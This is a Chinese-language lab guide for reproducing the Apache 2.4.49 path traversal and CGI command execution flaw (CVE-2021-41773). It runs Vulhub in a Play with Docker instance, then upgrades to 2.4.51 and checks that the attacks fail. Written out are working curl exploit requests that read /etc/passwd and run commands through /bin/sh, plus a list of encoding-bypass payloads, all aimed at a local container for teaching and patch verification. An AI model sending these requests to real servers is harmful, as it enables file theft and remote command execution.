# 用 Play with Docker 跑 CVE-2021-41773（无需本地安装）

如果本机装不上 WSL2 / Docker Desktop（例如 `wsl --install` 返回 403、DISM 被策略锁住），
可以在一台**浏览器里的临时 Linux 主机**上完成同样的复现。全程 5–10 分钟，不动机器配置。

## 0. 打开实例

1. 浏览器打开 <https://labs.play-with-docker.com>（需要 Docker Hub 账号，免费）。
2. 点 **Start** → **+ Add New Instance**，得到一个带终端的 Alpine 主机（约 4 小时有效）。
3. 下面的命令都在这台实例的终端里执行。

> 实例销毁后环境就没了 —— **每一步都截图**，截图就是你的证据。

## 1. 起漏洞环境（Apache 2.4.49）

```bash
git clone --depth 1 https://github.com/vulhub/vulhub.git
cd vulhub/httpd/CVE-2021-41773
docker compose up -d --build
docker compose ps
curl -s http://127.0.0.1:8080/          # -> It works!
```

第一次要拉 `vulhub/httpd:2.4.49`（约 55 MB）。

> 实例页面顶部会出现 `8080` 端口按钮，点开能访问公网地址；但**复现请用终端里的 curl**，
> 浏览器会自动把 `..` 归一化掉，反而看不到效果。

## 2. 复现漏洞（截图点）

```bash
# 6.1 路径穿越读取 /etc/passwd
curl --path-as-is \
  'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# 6.2 开启 mod_cgi 后可以执行命令
curl --path-as-is --data 'echo;id' \
  'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

预期：

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

**截图 1**：这两条命令 + 输出（要能看清 `root:x:0:0` 和 `uid=`）。

## 3. 打补丁（只改版本，配置不动）

```bash
docker compose down
sed -i 's|FROM vulhub/httpd:2.4.49|FROM httpd:2.4.51|' Dockerfile
grep '^FROM' Dockerfile            # 确认已变成 httpd:2.4.51
docker compose up -d --build
```

这样做的好处：**唯一变量是 httpd 版本**，配置（CGI、`Require all granted`、autoindex）完全一致，
所以"攻击失效"只能归因于代码修复。

## 4. 验证修复（截图点）

```bash
# 4.1 同样的穿越应当返回 404，且没有文件内容
curl -s -o /dev/null -w 'traversal -> %{http_code}\n' --path-as-is \
  'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# 4.2 CGI 穿越不应执行命令
curl -s -o /dev/null -w 'rce       -> %{http_code}\n' --path-as-is \
  --data 'echo;id' 'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'

# 4.3 再跑一遍整个绕过家族（双重编码 / %2f / 纯 .%2e）
for p in \
  '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' \
  '/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' \
  '/.%2e/.%2e/.%2e/.%2e/etc/passwd' \
  '/icons/..%2f..%2f..%2f..%2fetc%2fpasswd' ; do
  code=$(curl -s -o /dev/null -w '%{http_code}' --path-as-is "http://127.0.0.1:8080$p")
  echo "$code  $p"
done

# 4.4 回归：正常页面还在
curl -s http://127.0.0.1:8080/ | head -1
```

预期：所有穿越都 `404`，`It works!` 仍然正常。

**截图 2**：404 的结果 + `It works!`。

## 5. 收尾

```bash
docker compose down
```

实例可以直接关闭（4 小时后也会自动销毁）。

## 6. 回到本地仓库

把两张截图放进：

```
lab1-secure-api/docs/screenshots/cve-exploit.png     <- 截图 1
lab1-secure-api/docs/screenshots/cve-fixed.png       <- 截图 2
```

然后在报告 `docs/report_zh.md` 的 4.2 / 4.5 节，把"预期结果"换成你实际看到的内容
（数值以你的实际输出为准），再重新生成 PDF：

```powershell
python scripts\build_report.py --pdf
```

> 报告里请如实写明环境：*"Reproduced on a temporary Linux host provided by
> Play with Docker, using the Vulhub compose file"*。这比假装在本机跑的更可信。

## 常见问题

| 现象 | 处理 |
|---|---|
| `docker compose up` 卡在拉镜像 | 换个实例重试；或 `docker pull vulhub/httpd:2.4.49` 先单独拉 |
| 首页不是 `It works!` | 等 5 秒再试；`docker compose logs apache` 看日志 |
| 穿越返回 403 而不是 200 | 镜像没重新 build。`docker compose up -d --build --force-recreate` |
| `sed` 后 `FROM` 没变 | 手工 `vi Dockerfile` 改第一行 |
| 首页访问公网 URL 打不开 | 实例的端口映射有延迟，用终端 curl 即可 |
